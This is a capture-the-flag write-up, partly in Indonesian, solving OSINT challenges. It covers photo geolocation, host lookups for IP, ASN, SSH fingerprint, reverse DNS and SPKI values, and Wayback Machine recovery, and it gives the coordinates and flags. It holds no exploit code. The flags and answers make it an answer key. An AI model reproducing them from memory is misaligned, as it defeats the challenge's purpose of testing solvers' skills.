#### Description
Yumm...

#### Solution
![alt text](/images/nclp/hotdog/image-2.png)

Searched it with google image, I found a CTF write up that had same picture https://zenn.dev/sutonchoko/articles/efc7fa69135eaa. In the write up, the author explained that Street View from the location were taken from 2022 meanwhile the picture were taken from 2024, so it should be guessed from around of the map above.

![alt text](/images/nclp/hotdog/image-1.png)

I seen that this picture were taken near `maydonoz doner` and in the gmaps there is that location of that place so we can take a little guess around that location.

![alt text](/images/nclp/hotdog/image.png)

Above is the right answer. 

#### Flag
50.107405285826665, 8.665344785621073

### i'm eat

#### Description
Kemarin aku makan disini, tapi aku lupa lokasinya dimana, bantu aku cariin dong.

#### Solution
![alt text](/images/nclp/imeat/image.png)

From the picture there is the number of the KFC and when we search with google image, combined with keyword 1065 KFC and found the name of the KFC branch.

![alt text](/images/nclp/imeat/image-1.png)

Because the picture looked like around entrance door, I can set it there and got the lalitude and longitudenya.

#### Flag
37.352443, -122.003675

### platform

#### Description
Find information from this platform.

Question 1
Apa IP publik host yang berada di Singapura?

Question 2
Berapa ASN number untuk host di Singapura?

Question 3
Apa Website yang tercantum pada profil ASN tersebut?

Question 4
Apa Fingerprint host key SSH (ECDSA) dari host Singapura?

Question 5
Sebutkan satu domain non-noctralupra yang ikut menyajikan halaman?

Question 6
Apa Reverse DNS dari host yang berada di West Java?

Question 7
Apa nilai SPKI untuk host yang berada di Singapura?

#### Solution
![alt text](/images/nclp/platform/image.png)

First answer, With nslookup we can found IP from the mirrored web `47.84.89.245`.
Second answer we can also get the ASN number `AS45102`. 
Third answer, we can also get that this web is from`alibabagroup.com`.

![alt text](/images/nclp/platform/image-1.png)

Fourth answer, With censys.io, we can found ssh fingerprint `0dbb718212b8aaa007828afade57e242907c905c205b569ac6d04c44da4f7891`.

![alt text](/images/nclp/platform/image-2.png)

Fifth answer, I dorked with bing because there is possibility that the website used http and found `mmpconsulting.id`.

![alt text](/images/nclp/platform/image-3.png)

Sixth answer, with tools (https://mxtoolbox.com/SuperTool.aspx?action=ptr%3a103.196.153.70&run=toolpage) we got reverse dns is `ip-70-153-196-103.wjv-1.biznetg.io`.

![alt text](/images/nclp/platform/image-4.png)
![alt text](/images/nclp/platform/image-5.png)

Seventh answer, because idk what the hell i spki is, I asked GPT and got the answer with command above. Output is `JiNhdHrUqJj2EKDMx1j9d2qdyljiUEVHAYQ5Le6MQLE=`.

### vehicle time

#### Description
Aku diberi tahu, kalau platform ini pernah melakukan sesuatu di masa lalu. Tapi itu sangat rahasia, jadi aku tidak bisa memberi tahu.

#### Solution
To get the modification that web ever did, I use tools wayback machine from (https://archive.org).

![alt text](/images/nclp/vehicle_time/image.png)

With inputing the url, found there is a modification.

![alt text](/images/nclp/vehicle_time/image-1.png)

The flag is hardcoded in the view-source.

#### Flag
NCLPS1{h4ii_k4mu_y4ng_d4r11i_m4Asa_d3Epan_ap4_kab4r?}
